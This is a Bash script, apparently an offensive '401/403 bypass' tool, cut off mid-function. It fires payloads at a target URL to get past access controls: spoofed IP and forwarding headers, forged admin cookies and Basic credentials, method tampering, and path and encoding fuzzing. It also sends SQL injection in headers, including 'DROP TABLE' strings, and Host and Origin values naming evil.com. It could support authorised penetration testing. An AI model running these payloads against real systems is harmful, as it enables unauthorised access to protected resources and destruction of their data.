#!/bin/bash

# 401/403 Bypass Tool - Enhanced Version
# Author: Ch4ndan Das

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

BYPASS_COUNT=0
TOTAL_TESTS=0

print_banner() {
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════╗"
    echo "║   401/403 Bypass Testing Tool            ║"
    echo "║   Enhanced Version v2.0                  ║"
    echo "║   Author: Ch4ndan Das                    ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
}

usage() {
    echo "Usage: $0 -u <URL> [-o output.txt] [-t timeout] [-d delay] [-x proxy]"
    echo ""
    echo "Options:"
    echo "  -u  Target URL (required)"
    echo "  -o  Output file (default: bypass_results.txt)"
    echo "  -t  Timeout in seconds (default: 10)"
    echo "  -d  Delay between requests in ms (default: 0)"
    echo "  -x  Proxy URL (e.g., http://127.0.0.1:8080)"
    echo "  -s  Show only successful bypasses"
    echo "  -h  Show this help"
    echo ""
    echo "Example: $0 -u https://example.com/admin -o results.txt -t 10 -x http://127.0.0.1:8080"
    exit 1
}

log_bypass() {
    local msg=$1
    echo -e "${GREEN}$msg${NC}" | tee -a "$OUTPUT"
    ((BYPASS_COUNT++))
}

log_info() {
    if [[ "$SILENT" != "true" ]]; then
        echo -e "$1" | tee -a "$OUTPUT"
    fi
}

get_response() {
    local url=$1
    local method=${2:-GET}
    local headers=("${@:3}")

    local cmd="curl -s -k -o /dev/null -w \"%{http_code} %{size_download}\""
    cmd+=" --max-time $TIMEOUT"
    cmd+=" -X \"$method\""

    [[ -n "$PROXY" ]] && cmd+=" -x \"$PROXY\""
    [[ $DELAY -gt 0 ]] && sleep $(echo "scale=3; $DELAY/1000" | bc)

    for header in "${headers[@]}"; do
        cmd+=" -H \"$header\""
    done

    ((TOTAL_TESTS++))
    eval $cmd "\"$url\"" 2>/dev/null
}

is_bypass() {
    local code=$1
    [[ "$code" == "200" || "$code" == "201" || "$code" == "204" ]]
}

is_interesting() {
    local code=$1
    [[ "$code" == "200" || "$code" == "201" || "$code" == "204" || "$code" == "301" || "$code" == "302" ]]
}

# ─── HTTP Methods ─────────────────────────────────────────────────────────────
test_http_methods() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing HTTP Methods...${NC}"

    local methods=("GET" "POST" "PUT" "DELETE" "PATCH" "HEAD" "OPTIONS" "TRACE"
        "CONNECT" "PROPFIND" "PROPPATCH" "MKCOL" "COPY" "MOVE" "LOCK" "UNLOCK"
        "VERSION-CONTROL" "REPORT" "CHECKOUT" "CHECKIN" "UNCHECKOUT"
        "MKWORKSPACE" "UPDATE" "LABEL" "MERGE" "BASELINE-CONTROL"
        "MKACTIVITY" "ORDERPATCH" "ACL" "SEARCH" "FOO" "BAR" "INVALID"
        "PURGE" "BAN" "REFRESH" "DEBUG" "TRACK" "ARBITRARY")

    for method in "${methods[@]}"; do
        local response; response=$(get_response "$url" "$method")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] METHOD $method: $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -X $method '$url'"
        else
            log_info "[~] METHOD $method: $http_code"
        fi
    done
}

# ─── IP Spoofing Headers ──────────────────────────────────────────────────────
test_headers() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing IP Spoof Headers...${NC}"

    local ips=("127.0.0.1" "localhost" "0.0.0.0" "192.168.1.1" "10.0.0.1" "172.16.0.1" "::1" "0177.0.0.1" "2130706433")
    local header_names=("X-Forwarded-For" "X-Forwarded-Host" "X-Real-IP" "X-Remote-IP"
        "X-Remote-Addr" "X-Originating-IP" "X-Client-IP" "X-Host"
        "X-Custom-IP-Authorization" "True-Client-IP" "CF-Connecting-IP"
        "Fastly-Client-IP" "X-Cluster-Client-IP" "X-ProxyUser-Ip"
        "X-Original-Remote-Addr" "X-Forwarded" "Forwarded-For"
        "X-Forwarded-Server" "X-Forwarded-By")

    for hname in "${header_names[@]}"; do
        for ip in "${ips[@]}"; do
            local header="$hname: $ip"
            local response; response=$(get_response "$url" "GET" "$header")
            local http_code; http_code=$(echo "$response" | awk '{print $1}')
            local content_length; content_length=$(echo "$response" | awk '{print $2}')

            if is_bypass "$http_code"; then
                log_bypass "[+] HEADER '$header': $http_code (Len: $content_length) - BYPASS!"
                log_bypass "    curl -H '$header' '$url'"
            else
                log_info "[~] HEADER '$header': $http_code"
            fi
        done
    done

    # Forwarded header RFC 7239 variations
    local forwarded_vals=("for=127.0.0.1" "for=localhost" "for=\"[::1]\"" "for=127.0.0.1;proto=http" "for=127.0.0.1;proto=https")
    for val in "${forwarded_vals[@]}"; do
        local response; response=$(get_response "$url" "GET" "Forwarded: $val")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')
        if is_bypass "$http_code"; then
            log_bypass "[+] HEADER 'Forwarded: $val': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H 'Forwarded: $val' '$url'"
        else
            log_info "[~] Forwarded: $val: $http_code"
        fi
    done
}

# ─── User-Agent Bypass ────────────────────────────────────────────────────────
test_user_agents() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing User-Agent Bypass...${NC}"

    local user_agents=(
        "Mozilla/5.0 (X11; Linux i686; rv:1.7.13) Gecko/20070322"
        "googlebot" "Googlebot/2.1" "Mozilla/5.0 (compatible; Googlebot/2.1)"
        "bingbot" "msnbot" "slurp" "DuckDuckBot" "Baiduspider"
        "Mozilla/5.0 (compatible; Yahoo! Slurp)"
        "facebookexternalhit/1.1" "Twitterbot/1.0"
        "curl/7.68.0" "python-requests/2.25.1" "Go-http-client/1.1"
        "Apache-HttpClient/4.5" "Java/11.0.1" "Wget/1.20"
        "PostmanRuntime/7.28" "Insomnia/2021.5.3"
        "Mozilla/5.0 (compatible; YandexBot/3.0)"
        "Mozilla/5.0 (compatible; AhrefsBot/7.0)"
        "Mozilla/5.0 (compatible; SemrushBot/7)"
        "internal-service/1.0" "health-checker/1.0"
        ""
    )

    for ua in "${user_agents[@]}"; do
        local response; response=$(get_response "$url" "GET" "User-Agent: $ua")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] UA '${ua:-empty}': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -A '$ua' '$url'"
        fi
    done
}

# ─── Path Fuzzing ─────────────────────────────────────────────────────────────
test_path_fuzzing() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Path Fuzzing...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)
    local path; path=$(echo "$url" | sed "s|$proto$host||")
    local clean_path; clean_path=$(echo "$path" | sed 's|^/||')

    local payloads=(
        "/%2e$clean_path" "/%252e$clean_path" "/$clean_path." "/$clean_path/."
        "/$clean_path/./" "/$clean_path/..;/" "/$clean_path;/" "/$clean_path%20"
        "/$clean_path%09" "/$clean_path?" "/$clean_path#" "/$clean_path/*"
        "/$clean_path.json" "/$clean_path.xml" "/$clean_path.html"
        "/$clean_path.php" "/$clean_path.asp" "/$clean_path.aspx" "/$clean_path.jsp"
        "/$clean_path/" "/$clean_path//" "/$clean_path///"
        "/$clean_path%00" "/$clean_path%0a" "/$clean_path%0d"
        "/$clean_path..;/" "/$clean_path;index.html"
        "/$clean_path?anything" "/$clean_path??anything"
        "/%2e%2e/$clean_path" "/%2e%2e%2f$clean_path"
        "/%252e%252e/$clean_path" "/%2f%2e%2e/$clean_path"
        "/..%2f$clean_path" "/%2e%2e%2f$clean_path"
        "/$clean_path%2e" "/$clean_path%252e"
        "/$clean_path%ef%bc%8f" "/$clean_path%c0%af"
        "/$clean_path\\" "/$clean_path\\\\"
        "/$clean_path~" "/$clean_path " "/ $clean_path"
        "/$clean_path::\$DATA" "/$clean_path%2f" "/$clean_path%5c" "/$clean_path%255c"
        "/$clean_path;.css" "/$clean_path;.js" "/$clean_path;foo=bar"
        "/$clean_path::$DATA" "/$clean_path%20::$DATA"
        "/$clean_path.bak" "/$clean_path.backup" "/$clean_path.old"
        "/$clean_path.tmp" "/$clean_path.swp" "/$clean_path.orig"
        "/$clean_path%2f%2e%2e%2f%2f" "/$clean_path//../"
        "/$clean_path/..%00/" "/$clean_path/..%0a/"
        # NEW: Double slash variations
        "//$clean_path" "///$clean_path"
        # NEW: Semicolon injection
        ";/$clean_path" "/;$clean_path"
        # NEW: Null byte variations
        "/$clean_path%00.html" "/$clean_path%00.php"
        # NEW: Overlong UTF-8
        "/%c0%ae%c0%ae/$clean_path" "/%e0%80%ae%e0%80%ae/$clean_path"
    )

    for payload in "${payloads[@]}"; do
        local test_url="${proto}${host}${payload}"
        local response; response=$(get_response "$test_url")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] PATH '$payload': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl '$test_url'"
        else
            log_info "[~] PATH '$payload': $http_code"
        fi
    done
}

# ─── Case Switching ───────────────────────────────────────────────────────────
test_case_switching() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Case Switching...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)
    local path; path=$(echo "$url" | sed "s|$proto$host||")

    local variations=(
        "$(echo "$path" | tr '[:lower:]' '[:upper:]')"
        "$(echo "$path" | tr '[:upper:]' '[:lower:]')"
        "$(echo "$path" | sed 's/^\(.\)/\U\1/')"
        "$(echo "$path" | python3 -c "import sys; s=sys.stdin.read().strip(); print(''.join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(s)))" 2>/dev/null || echo "")"
    )

    for var in "${variations[@]}"; do
        [[ -z "$var" ]] && continue
        local test_url="${proto}${host}${var}"
        local response; response=$(get_response "$test_url")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] CASE '$var': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl '$test_url'"
        else
            log_info "[~] CASE '$var': $http_code"
        fi
    done
}

# ─── URL Override Headers ─────────────────────────────────────────────────────
test_url_override() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing URL Override Headers...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)
    local path; path=$(echo "$url" | sed "s|$proto$host||")

    local headers=(
        "X-Original-URL: /admin" "X-Original-URL: $path" "X-Original-URL: /"
        "X-Rewrite-URL: /admin" "X-Rewrite-URL: $path" "X-Rewrite-URL: /"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "Referer: http://localhost" "Referer: http://127.0.0.1"
        "Referer: https://$host"
        # NEW
        "X-Override-URL: $path" "X-Forwarded-Path: $path"
        "X-Forwarded-Prefix: $path" "X-Proxy-Url: http://localhost$path"
        "Destination: http://localhost$path"
        "X-Backend-URL: http://localhost$path"
        "X-Forwarded-Request-Uri: $path"
        "X-Nginx-Proxy-Pass: http://localhost$path"
        "X-Proxy-Pass: http://localhost$path"
    )

    for header in "${headers[@]}"; do
        local response; response=$(get_response "$url" "GET" "$header")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] URL_OVERRIDE '$header': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H '$header' '$url'"
        else
            log_info "[~] URL_OVERRIDE '$header': $http_code"
        fi
    done
}

# ─── Auth Bypass Headers ──────────────────────────────────────────────────────
test_auth_bypass_headers() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Authentication Bypass Headers...${NC}"

    local headers=(
        "X-Authenticated-User: admin" "X-User: admin" "X-Username: admin"
        "X-User-ID: 1" "X-Auth-User: admin" "X-Remote-User: admin"
        "X-Auth-Token: admin" "X-Auth-Token: null"
        "Authorization: Bearer null" "Authorization: Bearer admin"
        "Authorization: Basic YWRtaW46YWRtaW4="   # admin:admin
        "Authorization: Basic YWRtaW46"             # admin:
        "Authorization: Basic dXNlcjp1c2Vy"         # user:user
        "Cookie: admin=true" "Cookie: authenticated=true" "Cookie: isAdmin=true"
        "Cookie: role=admin" "Cookie: auth=1" "Cookie: session=admin"
        "X-Role: admin" "X-Privilege: admin" "X-Account: admin"
        # NEW
        "X-Admin: true" "X-Is-Admin: true" "X-Superuser: true"
        "X-Internal: true" "X-Service: internal"
        "X-API-Key: admin" "X-API-Key: null" "X-API-Key: undefined"
        "X-Access-Token: admin" "X-Auth: 1"
        "Authorization: Token admin" "Authorization: null"
        "X-Auth-Override: true" "X-Bypass-Auth: true"
        "X-Authenticated: true" "X-Authorized: true"
        "X-Debug-Auth: true" "X-Skip-Auth: true"
        "X-OAuth-Scopes: admin" "X-JWT-Token: admin"
        "X-Tenant: admin" "X-Org: admin" "X-Group: admin"
    )

    for header in "${headers[@]}"; do
        local response; response=$(get_response "$url" "GET" "$header")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] AUTH '$header': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H '$header' '$url'"
        else
            log_info "[~] AUTH '$header': $http_code"
        fi
    done
}

# ─── Verb Tampering ───────────────────────────────────────────────────────────
test_verb_tampering() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing HTTP Verb Tampering...${NC}"

    local methods=("GET" "POST" "PUT" "DELETE" "PATCH" "HEAD" "OPTIONS")
    local override_headers=("X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method" "_method" "x-tunneled-method")

    for method in "${methods[@]}"; do
        for oh in "${override_headers[@]}"; do
            local response; response=$(get_response "$url" "POST" "$oh: $method")
            local http_code; http_code=$(echo "$response" | awk '{print $1}')
            local content_length; content_length=$(echo "$response" | awk '{print $2}')

            if is_bypass "$http_code"; then
                log_bypass "[+] VERB_TAMPER '$oh: $method': $http_code (Len: $content_length) - BYPASS!"
                log_bypass "    curl -X POST -H '$oh: $method' '$url'"
            else
                log_info "[~] VERB_TAMPER '$oh: $method': $http_code"
            fi
        done
    done
}

# ─── Proxy/CDN Headers ────────────────────────────────────────────────────────
test_proxy_headers() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Proxy/CDN Headers...${NC}"

    local headers=(
        "CF-Connecting-IP: 127.0.0.1" "True-Client-IP: 127.0.0.1"
        "X-ProxyUser-Ip: 127.0.0.1"
        "X-Forwarded-Proto: https" "X-Forwarded-Scheme: https"
        "X-Forwarded-Ssl: on" "Front-End-Https: on"
        "X-Arr-SSL: on" "Cloudfront-Viewer-Country: US"
        "CF-IPCountry: US"
        "X-WAP-Profile: http://127.0.0.1"
        "Profile: http://127.0.0.1"
        "X-Arbitrary: http://127.0.0.1"
        "Base-Url: http://127.0.0.1"
        # NEW
        "X-Forwarded-Port: 443" "X-Forwarded-Port: 80"
        "X-Azure-ClientIP: 127.0.0.1"
        "X-Azure-SocketIP: 127.0.0.1"
        "Akamai-Origin-Hop: 1"
        "X-Cdn-Src-Country: US"
        "X-BB-IP: 127.0.0.1"
        "X-Lightspeed-Cache: hit"
        "X-Sucuri-Clientip: 127.0.0.1"
        "X-Incap-Client-IP: 127.0.0.1"
        "X-Forwarded-Ip: 127.0.0.1"
    )

    for header in "${headers[@]}"; do
        local response; response=$(get_response "$url" "GET" "$header")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] PROXY '$header': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H '$header' '$url'"
        else
            log_info "[~] PROXY '$header': $http_code"
        fi
    done
}

# ─── Hop-by-Hop ───────────────────────────────────────────────────────────────
test_hop_by_hop() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Hop-by-Hop Header Bypass...${NC}"

    local headers=("X-Forwarded-For" "Authorization" "X-Real-IP"
        "X-Original-URL" "X-Rewrite-URL" "Cookie" "Transfer-Encoding"
        "Content-Length" "Keep-Alive" "TE" "Upgrade")

    for header in "${headers[@]}"; do
        local response; response=$(get_response "$url" "GET" "Connection: $header")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_interesting "$http_code"; then
            log_bypass "[+] HOP-BY-HOP 'Connection: $header': $http_code (Len: $content_length) - INTERESTING!"
        else
            log_info "[~] HOP-BY-HOP 'Connection: $header': $http_code"
        fi
    done
}

# ─── Content-Type ─────────────────────────────────────────────────────────────
test_content_type() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Content-Type Variations...${NC}"

    local content_types=(
        "application/json" "application/xml" "application/x-www-form-urlencoded"
        "multipart/form-data" "text/plain" "text/html"
        "application/x-www-form-urlencoded; charset=utf-8"
        # NEW
        "application/ld+json" "application/graphql"
        "application/x-protobuf" "application/msgpack"
        "application/octet-stream" "*/*"
    )

    for ct in "${content_types[@]}"; do
        local response; response=$(get_response "$url" "POST" "Content-Type: $ct")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_interesting "$http_code"; then
            log_bypass "[+] CONTENT-TYPE '$ct': $http_code (Len: $content_length) - POSSIBLE BYPASS!"
        else
            log_info "[~] CONTENT-TYPE '$ct': $http_code"
        fi
    done
}

# ─── Spring Framework ─────────────────────────────────────────────────────────
test_spring_bypass() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Spring Framework Bypass...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)
    local path; path=$(echo "$url" | sed "s|$proto$host||")

    local payloads=(
        "${path}." "${path}.json" "${path}.xml" "${path}.html"
        "${path}/." "${path}/" "${path};.css" "${path};.js"
        "${path};foo=bar" "${path};index.jsp" "${path};index.php"
        # NEW: Spring Actuator paths
        "${path}/actuator" "${path}/actuator/health"
        "${path}/actuator/env" "${path}/actuator/info"
        # NEW: Spring path variations
        "${path}/.." "${path}/../${path##*/}"
        "${path};anything" "${path};a=b;c=d"
    )

    for payload in "${payloads[@]}"; do
        local test_url="${proto}${host}${payload}"
        local response; response=$(get_response "$test_url")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_interesting "$http_code"; then
            log_bypass "[+] SPRING '$payload': $http_code (Len: $content_length) - POSSIBLE BYPASS!"
            log_bypass "    curl '$test_url'"
        else
            log_info "[~] SPRING '$payload': $http_code"
        fi
    done
}

# ─── Nginx ACL Bypass ─────────────────────────────────────────────────────────
test_nginx_acl_bypass() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Nginx ACL Bypass...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)
    local path; path=$(echo "$url" | sed "s|$proto$host||")

    local payloads=(
        "$path " "$path." "$path./" "$path//" "$path/./"
        "$path/." "$path/%2e/" "$path/%2f/" "$path/;/" "$path/.;/"
        "$path//;/" "$path/%20" "$path%20/" "$path%09"
        "$path?" "$path??" "$path#" "$path#/" "$path/*"
        "$path/**" "$path/*/index.html"
        # NEW
        "$path%0a" "$path%0d" "$path%23" "$path%3f"
        "/$path" "//$host$path" "////$path"
        "$path%2f" "$path%5c" "$path%5c/"
        "$path#/../$path"
        "$path%09/" "$path\t"
    )

    for payload in "${payloads[@]}"; do
        local test_url="${proto}${host}${payload}"
        local response; response=$(get_response "$test_url")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] NGINX '$payload': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl '$test_url'"
        else
            log_info "[~] NGINX '$payload': $http_code"
        fi
    done
}

# ─── Cache Headers ────────────────────────────────────────────────────────────
test_cache_poisoning() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Cache/Misc Headers...${NC}"

    local headers=(
        "X-Cache: hit" "Cache-Control: no-cache" "Pragma: no-cache"
        "Age: 0" "X-Forwarded-Prefix: /admin" "X-Forwarded-Path: /admin"
        "X-Original-Remote-Addr: 127.0.0.1" "X-Remote-Addr: 127.0.0.1"
        # NEW
        "X-Cache-Hit: 1" "X-Varnish-Cache: HIT"
        "X-WordPress-Cache: HIT" "X-Drupal-Cache: HIT"
        "Vary: X-Forwarded-For" "Surrogate-Key: admin"
        "X-Cache-Tags: admin" "X-Dispatch: internal"
    )

    for header in "${headers[@]}"; do
        local response; response=$(get_response "$url" "GET" "$header")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] CACHE '$header': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H '$header' '$url'"
        else
            log_info "[~] CACHE '$header': $http_code"
        fi
    done
}

# ─── Request Smuggling Headers ────────────────────────────────────────────────
test_request_smuggling() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Transfer-Encoding Headers...${NC}"

    local headers=(
        "Transfer-Encoding: chunked" "Transfer-Encoding: identity"
        "Transfer-Encoding: gzip" "Transfer-Encoding: compress"
        "Transfer-Encoding: deflate" "Transfer-Encoding: chunked, identity"
        "Content-Length: 0"
        # NEW
        "Transfer-Encoding: chunked\r\n" "Transfer-Encoding : chunked"
        "Transfer-Encoding:chunked" "Transfer-Encoding:  chunked"
        "Transfer-Encoding: xchunked" "Transfer-Encoding: Chunked"
        "Transfer-Encoding: CHUNKED"
    )

    for header in "${headers[@]}"; do
        local response; response=$(get_response "$url" "GET" "$header")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] SMUGGLING '$header': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H '$header' '$url'"
        else
            log_info "[~] SMUGGLING '$header': $http_code"
        fi
    done
}

# ─── Parameter Pollution ──────────────────────────────────────────────────────
test_parameter_pollution() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing Parameter Pollution...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)
    local path; path=$(echo "$url" | sed "s|$proto$host||")

    local payloads=(
        "$path?admin=1" "$path?authenticated=true" "$path?debug=true"
        "$path?test=true" "$path?role=admin" "$path?access=granted"
        "$path?auth=1" "$path?user=admin" "$path?isAdmin=true"
        "$path?bypass=true"
        # NEW
        "$path?admin=true&admin=false"
        "$path?__proto__[admin]=true"
        "$path?constructor[admin]=true"
        "$path?admin%00=true"
        "$path?_method=GET"
        "$path?json=true"
        "$path?format=json"
        "$path?callback=x"
        "$path?wsdl"
        "$path?%2Fadmin=1"
        "$path?next=http://127.0.0.1"
        "$path?url=http://127.0.0.1"
        "$path?redirect=http://127.0.0.1"
    )

    for payload in "${payloads[@]}"; do
        local test_url="${proto}${host}${payload}"
        local response; response=$(get_response "$test_url")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] PARAM '$payload': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl '$test_url'"
        else
            log_info "[~] PARAM '$payload': $http_code"
        fi
    done
}

# ─── SQLi in Headers ─────────────────────────────────────────────────────────
test_sqli_in_headers() {
    local url=$1
    echo -e "\n${YELLOW}[*] Testing SQLi in Headers...${NC}"

    local payloads=(
        "X-Forwarded-For: ' OR '1'='1"
        "X-Forwarded-For: admin'--"
        "X-Forwarded-For: 1' UNION SELECT NULL--"
        "Referer: ' OR '1'='1"
        "User-Agent: ' OR '1'='1"
        # NEW
        "X-Forwarded-For: 1; DROP TABLE users--"
        "X-Forwarded-For: 1 OR 1=1"
        "X-Forwarded-For: 1' OR '1'='1'--"
        "User-Agent: '; DROP TABLE sessions--"
        "Cookie: id=1 OR 1=1"
        "Cookie: id=1' OR '1'='1"
    )

    for payload in "${payloads[@]}"; do
        local response; response=$(get_response "$url" "GET" "$payload")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] SQLI '$payload': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H \"$payload\" '$url'"
        else
            log_info "[~] SQLI '$payload': $http_code"
        fi
    done
}

# ─── NEW: Protocol & Version Bypass ───────────────────────────────────────────
test_protocol_bypass() {
    local url=$1
    echo -e "\n${CYAN}[*] Testing Protocol Version Bypass...${NC}"

    local response; response=$(curl -s -k -o /dev/null -w "%{http_code} %{size_download}" --http1.0 --max-time "$TIMEOUT" "$url" 2>/dev/null)
    local http_code; http_code=$(echo "$response" | awk '{print $1}')
    local content_length; content_length=$(echo "$response" | awk '{print $2}')
    ((TOTAL_TESTS++))
    if is_bypass "$http_code"; then
        log_bypass "[+] HTTP/1.0: $http_code (Len: $content_length) - BYPASS!"
        log_bypass "    curl --http1.0 '$url'"
    else
        log_info "[~] HTTP/1.0: $http_code"
    fi

    local response; response=$(curl -s -k -o /dev/null -w "%{http_code} %{size_download}" --http1.1 --max-time "$TIMEOUT" "$url" 2>/dev/null)
    local http_code; http_code=$(echo "$response" | awk '{print $1}')
    ((TOTAL_TESTS++))
    if is_bypass "$http_code"; then
        log_bypass "[+] HTTP/1.1: $http_code (Len: $content_length) - BYPASS!"
    else
        log_info "[~] HTTP/1.1: $http_code"
    fi

    # HTTP/2
    local response; response=$(curl -s -k -o /dev/null -w "%{http_code} %{size_download}" --http2 --max-time "$TIMEOUT" "$url" 2>/dev/null)
    local http_code; http_code=$(echo "$response" | awk '{print $1}')
    ((TOTAL_TESTS++))
    if is_bypass "$http_code"; then
        log_bypass "[+] HTTP/2: $http_code (Len: $content_length) - BYPASS!"
        log_bypass "    curl --http2 '$url'"
    else
        log_info "[~] HTTP/2: $http_code"
    fi
}

# ─── NEW: Host Header Injection ───────────────────────────────────────────────
test_host_header_injection() {
    local url=$1
    echo -e "\n${CYAN}[*] Testing Host Header Injection...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)

    local payloads=(
        "localhost" "127.0.0.1" "0.0.0.0" "::1"
        "$host:80" "$host:443" "$host:8080" "$host:8443"
        "$host.evil.com" "evil.com" "internal"
        "$host@evil.com" "$host:password@$host"
        "localhost:80" "localhost:443"
    )

    for payload in "${payloads[@]}"; do
        local response; response=$(get_response "$url" "GET" "Host: $payload")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] HOST 'Host: $payload': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H 'Host: $payload' '$url'"
        else
            log_info "[~] HOST 'Host: $payload': $http_code"
        fi
    done

    # X-Host / X-Forwarded-Host
    for payload in "${payloads[@]}"; do
        local response; response=$(get_response "$url" "GET" "X-Host: $payload")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        if is_bypass "$http_code"; then
            log_bypass "[+] HOST 'X-Host: $payload': $http_code - BYPASS!"
            log_bypass "    curl -H 'X-Host: $payload' '$url'"
        fi
    done
}

# ─── NEW: CORS Bypass ─────────────────────────────────────────────────────────
test_cors_bypass() {
    local url=$1
    echo -e "\n${CYAN}[*] Testing CORS Bypass...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)

    local origins=(
        "http://localhost" "https://localhost" "null"
        "http://127.0.0.1" "https://127.0.0.1"
        "https://$host.evil.com" "https://evil$host"
        "http://subdomain.$host" "https://sub.$host"
        "file://"
    )

    for origin in "${origins[@]}"; do
        local response; response=$(get_response "$url" "GET" "Origin: $origin")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

        if is_bypass "$http_code"; then
            log_bypass "[+] CORS 'Origin: $origin': $http_code (Len: $content_length) - BYPASS!"
            log_bypass "    curl -H 'Origin: $origin' '$url'"
        else
            log_info "[~] CORS 'Origin: $origin': $http_code"
        fi
    done
}

# ─── NEW: GraphQL Bypass ──────────────────────────────────────────────────────
test_graphql_bypass() {
    local url=$1
    echo -e "\n${CYAN}[*] Testing GraphQL Endpoint Bypass...${NC}"

    local proto; proto=$(echo "$url" | grep -oP '^https?://')
    local host; host=$(echo "$url" | sed "s|$proto||" | cut -d'/' -f1)

    local endpoints=("/graphql" "/api/graphql" "/v1/graphql" "/v2/graphql" "/query" "/gql")

    for ep in "${endpoints[@]}"; do
        local test_url="${proto}${host}${ep}"
        local response; response=$(get_response "$test_url")
        local http_code; http_code=$(echo "$response" | awk '{print $1}')
        local content_length; content_length=$(echo "$response" | awk '{print $2}')

